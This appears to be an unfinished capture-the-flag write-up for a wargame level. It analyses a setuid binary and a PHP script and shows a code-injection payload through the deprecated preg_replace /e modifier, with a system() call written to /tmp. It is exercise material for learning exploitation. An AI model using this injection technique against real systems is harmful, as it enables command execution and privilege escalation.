# level04

## Scanning

**1. Who are we ?**
```sh
$ id
uid=2006(level06) gid=2006(level06) groups=2006(level06),100(users)
```

**2. Where are we ?** 👀
```sh
$ ls -laR
.:
total 24
dr-xr-x---+ 1 level06 level06  140 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level06 level06  220 Apr  3  2012 .bash_logout
-r-x------  1 level06 level06 3518 Aug 30  2015 .bashrc
-rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06  level06  356 Mar  5  2016 level06.php
-r-x------  1 level06 level06  675 Apr  3  2012 .profile
```

## Solution

We found two suspicious files:
- `/home/user/level06/level06`, a binary file.
- `/home/user/level06/level06.php`, a php script.

**Privileges**

We determined `/home/user/level06/level06` is a prime candidate for privilege escalation because:
- It is owned by `flag06` (our target).
- The group owner is `level06` (which matches our user's group).
- It has the `setuid permission bit` (`s`) set, which grants us the owner's privileges during the program's execution.

This means that, during script execution through the user `level06`, the privilege state is as follows:  
- Real UID: `level06`
- Real GUID: `level06`
- Effective UID: `flag06`
- Effective GUID: `level06`

** Languages **

`/home/user/level06/level06.php` is a PHP script. PHP is an interpreted language, this means we can read it's content easily.

**Script behaviour**

Let's see the content of `/home/user/level06/level06.php`.
Here we used a [web php beautifier](https://codebeautify.org/php-beautifier) as the source code is squashed and added comments to describe the behaviour of each line.
```php
#!/usr/bin/php
<?php
function y($m)
{
    $m = preg_replace("/\./", " x ", $m); // Replaces any found '.' by ' x ' in the string '$m'.
    $m = preg_replace("/@/", " y", $m); // Replaces any found '@' by ' y' in the string '$m'
    return $m;
}

function x($y, $z)
{
    $a = file_get_contents($y); // Reads file '$y'
	// It matches strings of the form [x ...], where ... can be any sequence of characters.
	// For the rest of the explanation, ... refers to that captured sequence.
	// - Group 1 captures the full match: [x ...]
	// - Group 2 captures only the content inside after "x " (i.e., ...).
	// The replacement builds a string y("..."), which due to the /e modifier, is evaluated/interpreted as PHP code.
	// This also implies it will call the `y` function on our payload.
    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
    $a = preg_replace("/\[/", "(", $a); // Replaces any found '[' by '(' in the string '$a'
    $a = preg_replace("/\]/", ")", $a); // Replaces any found ']' by ')' in the string '$a'
    return $a;
}

$r = x($argv[1], $argv[2]); // Formats the first process parameter. The second argument is ignored.
print $r; // Prints the retuned formatted first process parameter.
?>
```

This means we can do **arbitrary PHP code injection** as specified here... TODO
We have to pass a string that allows execution of code in a string before it is passed to the `y()` function.
We will need to use [PHP string interpolation](https://stackoverflow.com/questions/43437121/php-string-interpolation-syntax).
As the string is not modified before being evaluated by the `\e` flag we are relatively fine.

echo '[x " . system("echo patate") . "]' > /tmp/checkflag.txt; /home/user/level06/level06.php /tmp/checkflag.txt;
